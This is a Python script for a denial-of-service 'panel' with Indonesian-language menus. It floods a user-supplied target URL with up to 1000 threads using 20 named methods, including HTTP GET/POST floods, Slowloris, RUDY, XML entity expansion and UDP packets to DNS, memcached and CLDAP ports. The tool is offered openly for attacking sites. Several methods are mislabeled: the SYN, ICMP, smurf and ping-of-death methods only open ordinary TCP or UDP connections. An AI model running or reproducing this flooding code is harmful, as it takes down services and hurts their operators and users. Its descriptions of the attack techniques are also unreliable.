#!/usr/bin/env python3
"""
NECRO-LU v1 - ULTIMATE DDOS PANEL
20 Method DDoS Attack Tool
"""

import threading
import time
import socket
import requests
import random
import ssl
import urllib3
from concurrent.futures import ThreadPoolExecutor
import sys
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class UltimateDDoSPanel:
    def __init__(self):
        self.attack_active = False
        self.request_count = 0
        self.target_url = ""
        self.thread_count = 50
        self.duration = 60
        self.selected_methods = []
        self.stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': 0,
            'active_threads': 0
        }
        
        # 20 DDoS Methods
        self.methods = {
            1: {"name": "TLS/SSL EXHAUSTION", "function": self.tls_exhaustion},
            2: {"name": "HTTP/2 MULTIPLEXING", "function": self.http2_flood},
            3: {"name": "SLOWLORIS CONNECTION", "function": self.slowloris},
            4: {"name": "UDP AMPLIFICATION", "function": self.udp_amplification},
            5: {"name": "MEMCACHED AMPLIFICATION", "function": self.memcached_amp},
            6: {"name": "SYN FLOOD", "function": self.syn_flood},
            7: {"name": "RUDY ATTACK", "function": self.rudy_attack},
            8: {"name": "LOIC HTTP FLOOD", "function": self.loic_flood},
            9: {"name": "XML ENTITY EXPANSION", "function": self.xxe_attack},
            10: {"name": "ACK FLOOD", "function": self.ack_flood},
            11: {"name": "HTTP POST FLOOD", "function": self.post_flood},
            12: {"name": "DNS QUERY FLOOD", "function": self.dns_flood},
            13: {"name": "PING OF DEATH", "function": self.ping_death},
            14: {"name": "SMURF ATTACK", "function": self.smurf_attack},
            15: {"name": "SLOW POST ATTACK", "function": self.slow_post},
            16: {"name": "ZALGO CHARACTER FLOOD", "function": self.zalgo_flood},
            17: {"name": "WEBSOCKET FLOOD", "function": self.websocket_flood},
            18: {"name": "ICMP FLOOD", "function": self.icmp_flood},
            19: {"name": "FRAGMENTATION ATTACK", "function": self.fragmentation_attack},
            20: {"name": "CLDAP REFLECTION", "function": self.cldap_attack}
        }

    def print_banner(self):
        banner = """
╔════════════════════════════════════════════════════════════════╗
║ ███╗   ██╗███████╗ ██████╗██████╗  ██████╗      ██╗   ██╗██╗  ║
║ ████╗  ██║██╔════╝██╔════╝██╔══██╗██╔═══██╗     ██║   ██║██║  ║
║ ██╔██╗ ██║█████╗  ██║     ██████╔╝██║   ██║     ██║   ██║██║  ║
║ ██║╚██╗██║██╔══╝  ██║     ██╔══██╗██║   ██║     ██║   ██║██║  ║
║ ██║ ╚████║███████╗╚██████╗██║  ██║╚██████╔╝     ╚██████╔╝██║  ║
║ ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝       ╚═════╝ ╚═╝  ║
║                    ULTIMATE DDOS PANEL v1.0                    ║
║                     20 METHOD GACOR ATTACK                     ║
╚════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def display_methods(self):
        print("\n" + "="*80)
        print("🎯 AVAILABLE DDOS METHODS:")
        print("="*80)
        for idx, method in self.methods.items():
            status = "✅ SELECTED" if idx in self.selected_methods else "❌ AVAILABLE"
            print(f"{idx:2d}. {method['name']:<25} [{status}]")
        print("="*80)

    def update_stats(self):
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        print(f"\r📊 STATS: Req: {self.stats['requests_sent']} | Success: {self.stats['successful_requests']} | Failed: {self.stats['failed_requests']} | RPS: {rps:.1f} | Threads: {self.stats['active_threads']}", end="")

    # METHOD 1: TLS/SSL EXHAUSTION
    def tls_exhaustion(self):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            host = self.target_url.split('//')[-1].split('/')[0]
            with socket.create_connection((host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    ssock.recv(1024)
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 2: HTTP/2 MULTIPLEXING FLOOD
    def http2_flood(self):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            response = requests.get(self.target_url, headers=headers, timeout=5, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 3: SLOWLORIS CONNECTION HOLD
    def slowloris(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
            
            # Keep connection alive
            start_time = time.time()
            while self.attack_active and (time.time() - start_time) < 30:
                s.send(f"X-a: {random.randint(1000, 9999)}\r\n".encode())
                time.sleep(10)
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 4: UDP AMPLIFICATION
    def udp_amplification(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            # DNS amplification payload
            payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (host, 53))
            sock.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 5: MEMCACHED AMPLIFICATION
    def memcached_amp(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (host, 11211))
            sock.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 6: SYN FLOOD
    def syn_flood(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            # Create raw socket for SYN flood
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 7: RUDY ATTACK
    def rudy_attack(self):
        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': '1000000'
            }
            data = 'a=' + 'x' * 999999
            response = requests.post(self.target_url, headers=headers, data=data, timeout=10, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 8: LOIC-STYLE HTTP FLOOD
    def loic_flood(self):
        try:
            response = requests.get(self.target_url, timeout=5, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 9: XML ENTITY EXPANSION
    def xxe_attack(self):
        try:
            xml_payload = '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>'''
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(self.target_url, data=xml_payload, headers=headers, timeout=5, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 10: ACK FLOOD
    def ack_flood(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            s.send(b'ACK')
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 11: HTTP POST FLOOD
    def post_flood(self):
        try:
            data = {'data': 'x' * 10000}
            response = requests.post(self.target_url, data=data, timeout=5, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 12: DNS QUERY FLOOD
    def dns_flood(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            socket.gethostbyname(host)
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 13: PING OF DEATH
    def ping_death(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            # Simulate ping with large packet
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            s.send(b'PING' + b'x' * 65500)
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 14: SMURF ATTACK
    def smurf_attack(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            # Simulate broadcast ping
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'PING', (host, 7))
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 15: SLOW POST ATTACK
    def slow_post(self):
        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': '1000000'
            }
            # Send data slowly
            response = requests.post(self.target_url, headers=headers, data='a', timeout=10, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 16: ZALGO CHARACTER FLOOD
    def zalgo_flood(self):
        try:
            zalgo_text = "ê̴̾̾͂́̋̆̔̕͝͠͠͝͝͝͝͝͝͝͝͝͝" * 100
            headers = {'X-Zalgo': zalgo_text}
            response = requests.get(self.target_url, headers=headers, timeout=5, verify=False)
            if response.status_code < 400:
                self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 17: WEBSOCKET FLOOD
    def websocket_flood(self):
        try:
            # Simulate WebSocket connection attempts
            host = self.target_url.split('//')[-1].split('/')[0]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            s.send(b'GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n')
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 18: ICMP FLOOD
    def icmp_flood(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            # Simulate ICMP with TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            s.send(b'ICMP')
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 19: FRAGMENTATION ATTACK
    def fragmentation_attack(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, 80))
            # Send fragmented data
            for i in range(10):
                s.send(f'FRAGMENT_{i}'.encode())
            s.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    # METHOD 20: CLDAP REFLECTION
    def cldap_attack(self):
        try:
            host = self.target_url.split('//')[-1].split('/')[0]
            payload = b'\x30\x84\x00\x00\x00\x2a\x02\x01\x01\x63\x84\x00\x00\x00\x21\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00'
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (host, 389))
            sock.close()
            self.stats['successful_requests'] += 1
        except:
            self.stats['failed_requests'] += 1
        self.stats['requests_sent'] += 1

    def attack_worker(self, method_id):
        while self.attack_active:
            try:
                self.stats['active_threads'] += 1
                method_func = self.methods[method_id]['function']
                method_func()
                self.stats['active_threads'] -= 1
            except Exception as e:
                self.stats['active_threads'] -= 1
                self.stats['failed_requests'] += 1

    def start_attack(self):
        if not self.selected_methods:
            print("❌ Pilih minimal 1 method terlebih dahulu!")
            return

        print(f"\n🚀 STARTING ATTACK ON: {self.target_url}")
        print(f"📋 METHODS: {len(self.selected_methods)} | THREADS: {self.thread_count} | DURATION: {self.duration}s")
        print("="*80)

        self.attack_active = True
        self.stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'active_threads': 0
        }

        # Start attack threads
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            for method_id in self.selected_methods:
                for _ in range(self.thread_count // len(self.selected_methods)):
                    executor.submit(self.attack_worker, method_id)

            # Update stats while attack is running
            start_time = time.time()
            while self.attack_active and (time.time() - start_time) < self.duration:
                self.update_stats()
                time.sleep(0.5)

        self.attack_active = False
        print(f"\n\n✅ ATTACK COMPLETED!")
        self.update_stats()
        print()

    def run(self):
        self.print_banner()
        
        while True:
            print("\n" + "="*80)
            print("🎮 CONTROL PANEL:")
            print("1. Set Target URL")
            print("2. Select Attack Methods")
            print("3. Set Thread Count")
            print("4. Set Duration")
            print("5. Start Attack")
            print("6. Exit")
            print("="*80)

            choice = input("👉 Pilih opsi (1-6): ").strip()

            if choice == '1':
                self.target_url = input("🎯 Masukkan Target URL: ").strip()
                if not self.target_url.startswith(('http://', 'https://')):
                    self.target_url = 'http://' + self.target_url
                print(f"✅ Target set: {self.target_url}")

            elif choice == '2':
                self.display_methods()
                methods_input = input("🔢 Pilih methods (pisahkan dengan koma, 0 untuk semua): ").strip()
                if methods_input == '0':
                    self.selected_methods = list(self.methods.keys())
                else:
                    self.selected_methods = [int(x.strip()) for x in methods_input.split(',') if x.strip().isdigit()]
                print(f"✅ {len(self.selected_methods)} methods selected")

            elif choice == '3':
                try:
                    self.thread_count = int(input("🧵 Thread count (1-1000): "))
                    self.thread_count = max(1, min(1000, self.thread_count))
                    print(f"✅ Threads set: {self.thread_count}")
                except:
                    print("❌ Input invalid")

            elif choice == '4':
                try:
                    self.duration = int(input("⏱️ Duration (seconds): "))
                    print(f"✅ Duration set: {self.duration}s")
                except:
                    print("❌ Input invalid")

            elif choice == '5':
                if not self.target_url:
                    print("❌ Set target URL terlebih dahulu!")
                    continue
                if not self.selected_methods:
                    print("❌ Pilih methods terlebih dahulu!")
                    continue
                
                self.start_attack()

            elif choice == '6':
                print("👋 Keluar dari program...")
                break

            else:
                print("❌ Pilihan tidak valid!")

if __name__ == "__main__":
    # Check if running as root for some methods
    if os.name != 'nt' and os.geteuid() != 0:
        print("⚠️  Beberapa method membutuhkan root privileges!")
    
    panel = UltimateDDoSPanel()
    panel.run()